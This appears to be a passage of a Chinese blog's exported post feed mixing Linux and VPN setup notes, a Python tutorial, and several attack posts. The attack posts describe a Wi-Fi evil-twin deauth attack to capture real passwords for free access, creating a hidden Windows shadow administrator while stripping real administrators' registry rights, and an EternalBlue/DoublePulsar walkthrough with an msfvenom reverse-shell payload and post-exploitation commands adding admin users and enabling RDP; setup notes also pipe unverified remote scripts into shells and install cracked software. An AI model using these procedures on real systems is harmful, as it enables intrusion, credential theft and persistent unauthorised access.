src="/images/%E5%9B%BE%E7%89%876.png"></p><ul><li>选择deauth攻击全部，选择</li></ul><p><img src="/images/%E5%9B%BE%E7%89%877.png"></p><ul><li>开始抓握手包，在AP与客户端数据传输中，抓取握手包，并且短时间造成无网状态。</li></ul><p><img src="/images/%E5%9B%BE%E7%89%878.png"></p><ul><li>抓到握手包了就会在右上角那个terminal里显示出wpa handshake。</li></ul><p><img src="/images/%E5%9B%BE%E7%89%879.png"></p><ul><li>创建ssl证书，建立假ap。</li></ul><p><img src="/images/%E5%9B%BE%E7%89%8710.png"></p><ul><li>在建立假AP之前，选择一个登陆界面给客户端，有很多种，我们选择中国。输入</li></ul><p><img src="/images/%E5%9B%BE%E7%89%8711.png"></p><ul><li>假AP名字是一样的，但是没有密码，你会看见两个同名字的AP。</li></ul><p><img src="/images/%E5%9B%BE%E7%89%8712.png"></p><ul><li>连入假AP后，我们terminal里会显示出客户端的信息。右上角clents online里写着mac，ip，系统信息。</li><li>客户端上打开浏览器，就会出现重新输入密码的页面。</li><li>输入密码后，做成握手包发送到真AP验证其真假。如果是真的就会如图。</li><li>这时，客户端输入真密码，验证成功后，我们也获取到了真密码，就可以开始使用免费wifi了。Terminal里显示出密码，密码这些，并且保存这个信息到一个文件里。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wifi安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali启用VPN连接组件</title>
      <link href="9858e5d2355c/"/>
      <url>9858e5d2355c/</url>
      
        <content type="html"><![CDATA[<p>apt-get install network-manager-openvpn-gnome<br>apt-get install network-manager-pptp<br>apt-get install network-manager-pptp-gnome<br>apt-get install network-manager-strongswan<br>apt-get install network-manager-vpnc<br>apt-get install network-manager-vpnc-gnome<br>/etc/init.d/network-manager restart</p>]]></content>
      
      
      <categories>
          
          <category> kali运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali安装VirtualBox增强包</title>
      <link href="214f0922b5e5/"/>
      <url>214f0922b5e5/</url>
      
        <content type="html"><![CDATA[<h3 id="how-install-linux-headers"><a href="#how-install-linux-headers" class="headerlink" title="how install linux-headers"></a>how install linux-headers</h3><p>1 install build-essential(optional)</p><p>sudo apt-get install build-essential</p><p>2 install linux-headers</p><p>sudo apt-get update<br>sudo apt-get install</p><p>Linux</p><p>-headers-$(uname -r)</p>]]></content>
      
      
      <categories>
          
          <category> kali运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux安装部署L2tp/Ipsec</title>
      <link href="042089037437/"/>
      <url>042089037437/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h3><p>如果遇到了安装完成之后连上无法上网，只有Tx数据包没有Rx数据包，多半是防火墙没有配置好masquerade端口重定向，配置好就行</p><p>基于 OpenVZ 虚拟化技术的 VPS 需要开启TUN/TAP才能正常使用，购买 VPS 时请先咨询服务商是否支持开启 TUN/TAP。</p><p>OpenVZ 虚拟的 VPS 需要系统内核支持 IPSec 才行。也就是说，母服务器的内核如果不支持的话那就没办法，只能换 VPS。 因此，一般不建议在 OpenVZ 的 VPS 上安装本脚本。脚本如果检测到该 VPS 为 OpenVZ 架构，会出现警告提醒。</p><p>如何检测是否支持TUN模块？ 执行命令： cat /dev/net/tun 如果返回信息为：cat: /dev/net/tun: File descriptor in bad state 说明正常</p><p>如何检测是否支持ppp模块？ 执行命令： cat /dev/ppp 如果返回信息为：cat: /dev/ppp: No such device or address 说明正常 当然，脚本在安装时也会执行检查，如果不适用于安装，脚本会予以提示。</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>root 用户登录后，运行以下命令：</p><p>wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh">https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh</a><br>chmod +x l2tp.sh<br>./l2tp.sh</p><p>执行后，会有如下交互界面</p><p><a href="https://teddysun.com/wp-content/uploads/2016/l2tp_1.png"><img src="/images/l2tp_1.png" alt="L2TP" title="L2TP一键安装脚本"></a></p><p>Please input IP-Range: (Default Range: 192.168.18): 输入本地IP段范围（本地电脑连接到VPS后给分配的一个本地IP地址），直接回车意味着输入默认值192.168.18</p><p>Please input PSK: (Default PSK: teddysun.com): PSK意为预共享密钥，即指定一个密钥将来在连接时需要用到，直接回车意味着输入默认值teddysun.com</p><p>Please input Username: (Default Username: teddysun): Username意为用户名，即第一个默认用户。直接回车意味着输入默认值teddysun</p><p>Please input teddysun’s password: (Default Password: Q4SKhu2EXQ): 输入用户的密码，默认会随机生成一个10位包含大小写字母和数字的密码，当然你也可以指定密码。</p><p>ServerIP:your_server_main_IP 显示你的 VPS 的主 IP（如果是多 IP 的 VPS 也只显示一个）</p><p>Server Local IP:192.168.18.1 显示你的 VPS 的本地 IP（默认即可）</p><p>Client Remote IP Range:192.168.18.2-192.168.18.254 显示 IP 段范围</p><p>PSK:teddysun.com 显示 PSK</p><p>Press any key to start…or Press Ctrl+c to cancel 按下任意按键继续，如果想取消安装，请按Ctrl+c键</p><p>安装完成后，脚本会执行 ipsec verify 命令并提示如下：</p><p>If there are no [FAILED] above, then you can connect to your<br>L2TP VPN Server with the default Username/Password is below:</p><p>ServerIP:your_server_IP<br>PSK:your PSK<br>Username:your usename<br>Password:your password</p><p>If you want to modify user settings, please use command(s):<br>l2tp -a (Add a user)<br>l2tp -d (Delete a user)<br>l2tp -l (List all users)<br>l2tp -m (Modify a user password)<br>Welcome to visit <a href="https://teddysun.com/448.html">https://teddysun.com/448.html</a><br>Enjoy it!</p><p>如果你要想对用户进行操作，可以使用如下命令： l2tp -a 新增用户 l2tp -d 删除用户 l2tp -m 修改现有的用户的密码 l2tp -l 列出所有用户名和密码 l2tp -h 列出帮助信息</p><h3 id="其他事项："><a href="#其他事项：" class="headerlink" title="其他事项："></a>其他事项：</h3><p>1、脚本在安装完成后，已自动启动进程，并加入了开机自启动。 2、脚本会改写 iptables 或 firewalld 的规则。 3、脚本安装时，会即时将安装日志写到 /root/l2tp.log 文件里，如果你安装失败，可以通过此文件来寻找错误信息。</p><h3 id="使用命令："><a href="#使用命令：" class="headerlink" title="使用命令："></a>使用命令：</h3><p>ipsec status （查看 IPSec 运行状态） ipsec verify （查看 IPSec 检查结果） /etc/init.d/ipsec start|stop|restart|status （CentOS6 下使用） /etc/init.d/xl2tpd start|stop|restart （CentOS6 下使用） systemctl start|stop|restart|status ipsec （CentOS7 下使用） systemctl start|stop|restart xl2tpd （CentOS7 下使用） service ipsec start|stop|restart|status （Debian/Ubuntu 下使用） service xl2tpd start|stop|restart （Debian/Ubuntu 下使用）</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>部署服务器端网络负载均衡协议</title>
      <link href="fc3d67abe3bc/"/>
      <url>fc3d67abe3bc/</url>
      
        <content type="html"><![CDATA[<h2 id="集成脚本"><a href="#集成脚本" class="headerlink" title="集成脚本"></a><strong>集成脚本</strong></h2><p><a href="https://github.com/ylx2016/Linux-NetSpeed/releases">https://github.com/ylx2016/Linux-NetSpeed/releases</a></p><p>不卸载内核<br>wget -N –no-check-certificate “<a href="https://github.000060000.xyz/tcpx.sh&quot;">https://github.000060000.xyz/tcpx.sh&quot;</a> &amp;&amp; chmod +x tcpx.sh &amp;&amp; ./tcpx.sh<br>wget -N “<a href="https://github.000060000.xyz/tcpx.sh&quot;">https://github.000060000.xyz/tcpx.sh&quot;</a> &amp;&amp; chmod +x tcpx.sh &amp;&amp; ./tcpx.sh<br>卸载内核<br>wget -N –no-check-certificate “<a href="https://github.000060000.xyz/tcp.sh&quot;">https://github.000060000.xyz/tcp.sh&quot;</a> &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh<br>wget -N “<a href="https://github.000060000.xyz/tcp.sh&quot;">https://github.000060000.xyz/tcp.sh&quot;</a> &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</p><p> </p><h2 id="GOOGLE-BBR"><a href="#GOOGLE-BBR" class="headerlink" title="GOOGLE BBR"></a><strong>GOOGLE BBR</strong></h2><h4 id="使用root用户登录，运行以下命令："><a href="#使用root用户登录，运行以下命令：" class="headerlink" title="使用root用户登录，运行以下命令："></a>使用root用户登录，运行以下命令：</h4><p>wget –no-check-certificate <a href="https://github.com/teddysun/across/raw/master/bbr.sh">https://github.com/teddysun/across/raw/master/bbr.sh</a><br>chmod +x bbr.sh<br>./bbr.sh</p><p>安装完成后，脚本会提示需要重启 VPS，输入 y 并回车后重启。 重启完成后，进入 VPS，验证一下是否成功安装最新内核并开启 TCP BBR，输入以下命令：</p><p>uname -r</p><p>查看内核版本，含有 4.11 就表示 OK 了</p><p>sysctl net.ipv4.tcp_available_congestion_control</p><p>返回值一般为：</p><p>net.ipv4.tcp_available_congestion_control = bbr cubic reno<br>sysctl net.ipv4.tcp_congestion_control</p><p>返回值一般为：</p><p>net.ipv4.tcp_congestion_control = bbr<br>sysctl net.core.default_qdisc</p><p>返回值一般为：</p><p>net.core.default_qdisc = fq<br>lsmod | grep bbr</p><p>返回值有 tcp_bbr 模块即说明bbr已启动。</p><h2 id="锐速"><a href="#锐速" class="headerlink" title="锐速"></a><strong>锐速</strong></h2><p><a href="https://www.91yun.co/archives/683">https://www.91yun.co/archives/683</a></p><h3 id="下载更换内核"><a href="#下载更换内核" class="headerlink" title="下载更换内核"></a>下载更换内核</h3><p><strong>CentOS6</strong> 内核更换为： 2.6.32-504.3.3.el6.x86_64</p><p>rpm -ivh <a href="http://soft.91yun.org/ISO/Linux/CentOS/kernel/kernel-firmware-2.6.32-504.3.3.el6.noarch.rpm">http://soft.91yun.org/ISO/Linux/CentOS/kernel/kernel-firmware-2.6.32-504.3.3.el6.noarch.rpm</a><br>rpm -ivh <a href="http://soft.91yun.org/ISO/Linux/CentOS/kernel/kernel-2.6.32-504.3.3.el6.x86/_64.rpm">http://soft.91yun.org/ISO/Linux/CentOS/kernel/kernel-2.6.32-504.3.3.el6.x86\_64.rpm</a> –force</p><p><strong>CentOS7</strong> 内核更换为： 3.10.0-229.1.2.el7.x86_64</p><p>rpm -ivh <a href="http://soft.91yun.org/ISO/Linux/CentOS/kernel/kernel-3.10.0-229.1.2.el7.x86/_64.rpm">http://soft.91yun.org/ISO/Linux/CentOS/kernel/kernel-3.10.0-229.1.2.el7.x86\_64.rpm</a> –force</p><p>如果提示缺少linux-firmware就</p><p>yum -y install linux-firmware</p><h3 id="锐速破解版安装方法："><a href="#锐速破解版安装方法：" class="headerlink" title="锐速破解版安装方法："></a>锐速破解版安装方法：</h3><p>wget -N –no-check-certificate <a href="https://github.com/91yun/serverspeeder/raw/master/serverspeeder.sh">https://github.com/91yun/serverspeeder/raw/master/serverspeeder.sh</a> &amp;&amp; bash serverspeeder.sh</p><h3 id="锐速破解版卸载方法："><a href="#锐速破解版卸载方法：" class="headerlink" title="锐速破解版卸载方法："></a>锐速破解版卸载方法：</h3><p>chattr -i /serverspeeder/etc/apx* &amp;&amp; /serverspeeder/bin/serverSpeeder.sh uninstall -f</p><h3 id="三合一脚本："><a href="#三合一脚本：" class="headerlink" title="三合一脚本："></a>三合一脚本：</h3><p>wget –no-check-certificate -O tcp.sh <a href="https://github.com/cx9208/Linux-NetSpeed/raw/master/tcp.sh">https://github.com/cx9208/Linux-NetSpeed/raw/master/tcp.sh</a> &amp;&amp; chmod +x tcp.sh &amp;&amp; ./tcp.sh</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务器信息测试脚本</title>
      <link href="7fdce70fb390/"/>
      <url>7fdce70fb390/</url>
      
        <content type="html"><![CDATA[<h2 id="测试系统信息以及全球网络延迟"><a href="#测试系统信息以及全球网络延迟" class="headerlink" title="测试系统信息以及全球网络延迟"></a>测试系统信息以及全球网络延迟</h2><p>wget -qO- bench.sh | bash</p><h2 id="91yun服务器测试"><a href="#91yun服务器测试" class="headerlink" title="91yun服务器测试"></a>91yun服务器测试</h2><p>wget -N –no-check-certificate <a href="https://raw.githubusercontent.com/91yun/91yuntest/master/test.sh">https://raw.githubusercontent.com/91yun/91yuntest/master/test.sh</a> &amp;&amp; bash test.sh -i “io,bandwidth,traceroute,backtraceroute,allping,gotoping”</p><h2 id="安装speedtest"><a href="#安装speedtest" class="headerlink" title="安装speedtest"></a>安装speedtest</h2><p>wget <a href="https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py">https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py</a><br>chmod +x speedtest.py<br>./speedtest.py</p>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nessus</title>
      <link href="db49ddfa33b4/"/>
      <url>db49ddfa33b4/</url>
      
        <content type="html"><![CDATA[<p>先关闭nessus：</p><p>/etc/init.d/nessus stop</p><p>在终端里输入</p><p>/opt/nessus/sbin/nessuscli fetch –register</p><p>你新申请的注册码</p>]]></content>
      
      
      <categories>
          
          <category> kali运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows创建影子管理员账户</title>
      <link href="f2e32ade4fe3/"/>
      <url>f2e32ade4fe3/</url>
      
        <content type="html"><![CDATA[<p><strong>1、给管理员注册表操作权限</strong> 在注册表中对系统账户的键值进行操作，需要到”HKEY_LOCAL_MACHINE\SAM\SAM”处进行修改，但是当我们来到该处时，会发现无法展开该处所在的键值。这是因为系统默认对系统管理员给予”写入D AC”和”读取控制”权限，没有给予修改权限，因此我们没有办法对”SAM”项下的键值进行查看和修改。不过我们可以借助系统中另一个”注册表编辑器”给管理员赋予修改权限。 点击”开始”→”运行”，输入”regedt32.exe”后回车，随后会弹出另一个”注册表编辑器”，和我们平时使用的”注册表编辑器”不同的是它可以修改系统账户操作注册表时的权限（为便于理解，以下简称regedt32.exe）。在regedt32.exe中来到”HKEY_LOCAL_MACHINE\SAM\SAM”处，点击”安全”菜单→”权限”，在弹出的”SAM的权限”编辑窗口中选中”administrators”账户，在下方的权限设置处勾选”完全控制”，完成后点击”确定”即可。然后我们切换回”注册表编辑器”，可以发现”HKEY_LOCAL_MACHINE\SAM\SAM”下面的键值都可以展开了。</p><p><strong>2、将隐藏账户替换为管理员</strong> 成功得到注册表操作权限后，我们就可以正式开始隐藏账户的制作了。来到注册表编辑器的”HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，当前系统中所有存在的账户都会在这里显示，当然包括我们的隐藏账户。点击我们的隐藏账户”piao$”，在右边显示的键值中的”类型”一项显示为0x3e9，向上来到”HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\“处，可以找到”000003E9”这一项，这两者是相互对应的，隐藏账户”piao$”的所有信息都在”000003E9”这一项中。同样的，我们可以找到”administrator”账户所对应的项为”000001F4”。 将”piao$”的键值导出为piao$.reg，同时将”000003E9”和”000001F4”项的F键值分别导出为user.reg，admin.reg。用”记事本”打开admin.reg，将其中”F”值后面的内容复制下来，替换user.reg中的”F”值内容，完成后保存。接下来进入”命令提示符”，输入”net user piao$ /del”将我们建立的隐藏账户删除。最后，将piao$.reg和user.reg导入注册表，至此，隐藏账户制作完成。</p><p><strong>3、切断删除隐藏账户的途径</strong> 虽然我们的隐藏账户已经在”命令提示符”和”计算机管理”中隐藏了，但是有经验的系统管理员仍可能通过注册表编辑器删除我们的隐藏账户，那么如何才能让我们的隐藏账户坚如磐石呢？ 打开”regedt32.exe”，来到”HKEY_LOCAL_MACHINE\SAM\SAM”处，设置”SAM”项的权限，将”administrators”所拥有的权限全部取消即可。当真正的管理员想对”HKEY_LOCAL_MACHINE\SAM\SAM”下面的项进行操作的时候将会发生错误，而且无法通过”regedt32.exe”再次赋予权限。这样没有经验的管理员即使发现了系统中的隐藏账户，也是无可奈何的。</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSA工具包MS17-010手动复现</title>
      <link href="61db1752a3ae/"/>
      <url>61db1752a3ae/</url>
      
        <content type="html"><![CDATA[<h4 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h4><h4 id="目标机器-192-168-100-123-Windows-Server-2008-R2"><a href="#目标机器-192-168-100-123-Windows-Server-2008-R2" class="headerlink" title="目标机器: 192.168.100.123  Windows Server 2008 R2"></a>目标机器: 192.168.100.123  Windows Server 2008 R2</h4><h4 id="攻击机1-192-168-8-117-Windows-Server-2012"><a href="#攻击机1-192-168-8-117-Windows-Server-2012" class="headerlink" title="攻击机1: 192.168.8.117 Windows Server 2012"></a>攻击机1: 192.168.8.117 Windows Server 2012</h4><h4 id="攻击机2-192-168-8-119-Kali-Linux"><a href="#攻击机2-192-168-8-119-Kali-Linux" class="headerlink" title="攻击机2:192.168.8.119 Kali Linux"></a>攻击机2:192.168.8.119 Kali Linux</h4><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>安装好python2.6.1以及pywin32</p><p>使用cmd进入~\NSA\windows目录</p><p>输入fb.py</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20170514025228-300x156.png"></p><p>配置输入好靶机IP以及攻击机1的IP</p><p>注意! : Use Redirection [yes] : 这里要选no</p><p><img src="/images/2-300x157.png"></p><p>配置好project信息</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fb &gt; use Eternalblue</span><br></pre></td></tr></table></figure><p>一路回车至</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\[\*\] Mode :: Delivery mechanism</span><br><span class="line"></span><br><span class="line">\*0) DANE Forward deployment via DARINGNEOPHYTE</span><br><span class="line">1) FB Traditional deployment from within FUZZBUNCH</span><br></pre></td></tr></table></figure><p>此处选择 1</p><p>继续回车可得到结果</p><p><img src="/images/3-300x159.png"></p><p>攻击机1闲置,开始操作攻击机2</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.8.119 LPORT=5555 -f dll &gt; /opt/win.dll</span><br></pre></td></tr></table></figure><p>即在攻击机2 /opt目录下得到恶意dll–&gt; win.dll</p><p>将win.dll转移到攻击机1上</p><p>接下来进入 msfconsole</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set lhost 192.168.8.119</span><br><span class="line">set lport 5555</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse\_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>出现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 192.168.8.119:5555</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure><p>进入下一步</p><p>在攻击机1上输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use Doublepulsar</span><br></pre></td></tr></table></figure><p>回车至出现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Function :: Operation for backdoor to perform</span><br></pre></td></tr></table></figure><p>选择2 Run DLL</p><p>并输入dll在攻击机1上的位置</p><p>回车至</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Doublepulsar Succeeded</span><br></pre></td></tr></table></figure><p>此时在攻击机2上已获得SHELL</p><p>攻击完成!</p><p> </p><h4 id="后续提权操作"><a href="#后续提权操作" class="headerlink" title="后续提权操作:"></a>后续提权操作:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user username password /add   //添加用户</span><br><span class="line">net localgroup administrators username /add  //将用户加入administrators权限组</span><br><span class="line">net user guest /active:yes  //激活guest账户</span><br><span class="line">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f  //开启远程桌面连接服务,会丢失连接</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux安装部署PPTP VPN服务</title>
      <link href="3daab1356e79/"/>
      <url>3daab1356e79/</url>
      
        <content type="html"><![CDATA[<p>wget <a href="http://mirrors.linuxeye.com/scripts/vpn/_centos.sh">http://mirrors.linuxeye.com/scripts/vpn\_centos.sh</a><br>chmod +x ./vpn_centos.sh<br>./vpn_centos.sh</p><p>如果遇到了安装完成之后连上无法上网，只有Tx数据包没有Rx数据包，多半是防火墙没有配置好masquerade端口重定向，配置好就行</p>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MS17-010 SMB Remote Code Execution</title>
      <link href="c0850573a975/"/>
      <url>c0850573a975/</url>
      
        <content type="html"><![CDATA[<h1 id="MS17-010-py"><a href="#MS17-010-py" class="headerlink" title="\\MS17-010.py"></a><strong>\\MS17-010.py</strong></h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="This-module-requires-Metasploit-http-metasploit-com-download"><a href="#This-module-requires-Metasploit-http-metasploit-com-download" class="headerlink" title="This module requires Metasploit: http://metasploit.com/download"></a>This module requires Metasploit: <a href="http://metasploit.com/download">http://metasploit.com/download</a></h1><h1 id="Current-source-https-github-com-rapid7-metasploit-framework"><a href="#Current-source-https-github-com-rapid7-metasploit-framework" class="headerlink" title="Current source: https://github.com/rapid7/metasploit-framework"></a>Current source: <a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></h1><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="auxiliary-scanner-smb-smb-ms-17-010"><a href="#auxiliary-scanner-smb-smb-ms-17-010" class="headerlink" title="auxiliary/scanner/smb/smb_ms_17_010"></a>auxiliary/scanner/smb/smb_ms_17_010</h1><p>require ‘msf/core’</p><p>class MetasploitModule &lt; Msf::Auxiliary</p><p>  include Msf::Exploit::Remote::SMB::Client<br>  include Msf::Exploit::Remote::SMB::Client::Authenticated</p><p>  include Msf::Auxiliary::Scanner<br>  include Msf::Auxiliary::Report</p><p>  def initialize(info = {})<br>    super(update_info(info,<br>      ‘Name’           =&gt; ‘MS17-010 SMB RCE Detection’,<br>      ‘Description’    =&gt; %q{<br>        Uses information disclosure to determine if MS17-010 has been patched or not.<br>        Specifically, it connects to the IPC$ tree and attempts a transaction on FID 0.<br>        If the status returned is “STATUS_INSUFF_SERVER_RESOURCES”, the machine does<br>        not have the MS17-010 patch.</p><pre><code>    This module does not require valid SMB credentials in default server    configurations. It can log on as the user &quot;\\&quot; and connect to IPC$.  &#125;,  &#39;Author&#39;         =&gt; \[ &#39;Sean Dillon &lt;sean.dillon@risksense.com&gt;&#39; \],  &#39;References&#39;     =&gt;    \[      \[ &#39;CVE&#39;, &#39;2017-0143&#39;\],      \[ &#39;CVE&#39;, &#39;2017-0144&#39;\],      \[ &#39;CVE&#39;, &#39;2017-0145&#39;\],      \[ &#39;CVE&#39;, &#39;2017-0146&#39;\],      \[ &#39;CVE&#39;, &#39;2017-0147&#39;\],      \[ &#39;CVE&#39;, &#39;2017-0148&#39;\],      \[ &#39;MSB&#39;, &#39;MS17-010&#39;\],      \[ &#39;URL&#39;, &#39;https://technet.microsoft.com/en-us/library/security/ms17-010.aspx&#39;\]    \],  &#39;License&#39;        =&gt; MSF\_LICENSE))</code></pre><p>  end</p><p>  def run_host(ip)<br>    begin<br>      status = do_smb_probe(ip)</p><pre><code>  if status == &quot;STATUS\_INSUFF\_SERVER\_RESOURCES&quot;    print\_warning(&quot;Host is likely VULNERABLE to MS17-010!&quot;)    report\_vuln(      host: ip,      name: self.name,      refs: self.references,      info: &#39;STATUS\_INSUFF\_SERVER\_RESOURCES for FID 0 against IPC$&#39;    )  elsif status == &quot;STATUS\_ACCESS\_DENIED&quot; or status == &quot;STATUS\_INVALID\_HANDLE&quot;    # STATUS\_ACCESS\_DENIED (Windows 10) and STATUS\_INVALID\_HANDLE (others)    print\_good(&quot;Host does NOT appear vulnerable.&quot;)  else    print\_bad(&quot;Unable to properly detect if host is vulnerable.&quot;)  endrescue ::Interrupt  print\_status(&quot;Exiting on interrupt.&quot;)  raise $!rescue ::Rex::Proto::SMB::Exceptions::LoginError  print\_error(&quot;An SMB Login Error occurred while connecting to the IPC$ tree.&quot;)rescue ::Exception =&gt; e  vprint\_error(&quot;#&#123;e.class&#125;: #&#123;e.message&#125;&quot;)ensure  disconnectend</code></pre><p>  end</p><p>  def do_smb_probe(ip)<br>    connect</p><pre><code># logon as user \\simple.login(datastore\[&#39;SMBName&#39;\], datastore\[&#39;SMBUser&#39;\], datastore\[&#39;SMBPass&#39;\], datastore\[&#39;SMBDomain&#39;\])# connect to IPC$ipc\_share = &quot;\\\\\\\\#&#123;ip&#125;\\\\IPC$&quot;simple.connect(ipc\_share)tree\_id = simple.shares\[ipc\_share\]print\_status(&quot;Connected to #&#123;ipc\_share&#125; with TID = #&#123;tree\_id&#125;&quot;)# request transaction with fid = 0pkt = make\_smb\_trans\_ms17\_010(tree\_id)sock.put(pkt)bytes = sock.get\_once# convert packet to response structpkt = Rex::Proto::SMB::Constants::SMB\_TRANS\_RES\_HDR\_PKT.make\_structpkt.from\_s(bytes\[4..-1\])# convert error code to stringcode = pkt\[&#39;SMB&#39;\].v\[&#39;ErrorClass&#39;\]smberr = Rex::Proto::SMB::Exceptions::ErrorCode.newstatus = smberr.get\_error(code)print\_status(&quot;Received #&#123;status&#125; with FID = 0&quot;)status</code></pre><p>  end</p><p>  def make_smb_trans_ms17_010(tree_id)<br>    # make a raw transaction packet<br>    pkt = Rex::Proto::SMB::Constants::SMB_TRANS_PKT.make_struct<br>    simple.client.smb_defaults(pkt[‘Payload’][‘SMB’])</p><pre><code># opcode 0x23 = PeekNamedPipe, fid = 0setup = &quot;\\x23\\x00\\x00\\x00&quot;setup\_count = 2             # 2 wordstrans = &quot;\\\\PIPE\\\\\\x00&quot;# calculate offsets to the SetupData payloadbase\_offset = pkt.to\_s.length + (setup.length) - 4param\_offset = base\_offset + trans.lengthdata\_offset = param\_offset # + 0# packet baselinespkt\[&#39;Payload&#39;\]\[&#39;SMB&#39;\].v\[&#39;Command&#39;\] = Rex::Proto::SMB::Constants::SMB\_COM\_TRANSACTIONpkt\[&#39;Payload&#39;\]\[&#39;SMB&#39;\].v\[&#39;Flags1&#39;\] = 0x18pkt\[&#39;Payload&#39;\]\[&#39;SMB&#39;\].v\[&#39;Flags2&#39;\] = 0x2801 # 0xc803 would unicodepkt\[&#39;Payload&#39;\]\[&#39;SMB&#39;\].v\[&#39;TreeID&#39;\] = tree\_idpkt\[&#39;Payload&#39;\]\[&#39;SMB&#39;\].v\[&#39;WordCount&#39;\] = 14 + setup\_countpkt\[&#39;Payload&#39;\].v\[&#39;ParamCountMax&#39;\] = 0xffffpkt\[&#39;Payload&#39;\].v\[&#39;DataCountMax&#39;\] = 0xffffpkt\[&#39;Payload&#39;\].v\[&#39;ParamOffset&#39;\] = param\_offsetpkt\[&#39;Payload&#39;\].v\[&#39;DataOffset&#39;\] = data\_offset# actual magic: PeekNamedPipe FID=0, \\PIPE\\pkt\[&#39;Payload&#39;\].v\[&#39;SetupCount&#39;\] = setup\_countpkt\[&#39;Payload&#39;\].v\[&#39;SetupData&#39;\] = setuppkt\[&#39;Payload&#39;\].v\[&#39;Payload&#39;\] = transpkt.to\_s</code></pre><p>  end<br>end</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python list、tuple、dict、set</title>
      <link href="3d1d5e11a38e/"/>
      <url>3d1d5e11a38e/</url>
      
        <content type="html"><![CDATA[<h1 id="list"><a href="#list" class="headerlink" title="list"></a>list</h1><ul><li>python内置的一种数据结构</li><li>有序</li><li>可更改（添加、删除）</li></ul><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ol><li><code>&gt;&gt;&gt; game = [&quot;dota&quot;, &quot;dota2&quot;, &quot;lol&quot;]</code></li><li><code>&gt;&gt;&gt; game</code></li><li><code>[&#39;dota&#39;, &#39;dota2&#39;, &#39;lol&#39;]</code></li></ol><h2 id="获取列表长度"><a href="#获取列表长度" class="headerlink" title="获取列表长度"></a>获取列表长度</h2><ol><li><code>&gt;&gt;&gt; len(game)</code></li><li><code>3</code></li></ol><h2 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h2><ol><li><code>&gt;&gt;&gt; game[0]</code></li><li><code>&#39;dota&#39;</code></li><li><code>&gt;&gt;&gt; game[1]</code></li><li><code>&#39;dota2&#39;</code></li><li><code>&gt;&gt;&gt; game[2]</code></li><li><code>&#39;lol&#39;</code></li><li><code>&gt;&gt;&gt; game[3]</code></li><li><code>Traceback (most recent call last):</code></li><li><code>File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</code></li><li><code>IndexError: list index out of range</code></li><li><code>&gt;&gt;&gt;</code></li></ol><p>如果下标越界会报错</p><h2 id="更改"><a href="#更改" class="headerlink" title="更改"></a>更改</h2><ol><li><code>&gt;&gt;&gt; game[0] = &quot;dota3&quot;</code></li><li><code>&gt;&gt;&gt; game</code></li><li><code>[&#39;dota3&#39;, &#39;dota2&#39;, &#39;lol&#39;]</code></li></ol><h2 id="增加元素"><a href="#增加元素" class="headerlink" title="增加元素"></a>增加元素</h2><h3 id="末尾追加"><a 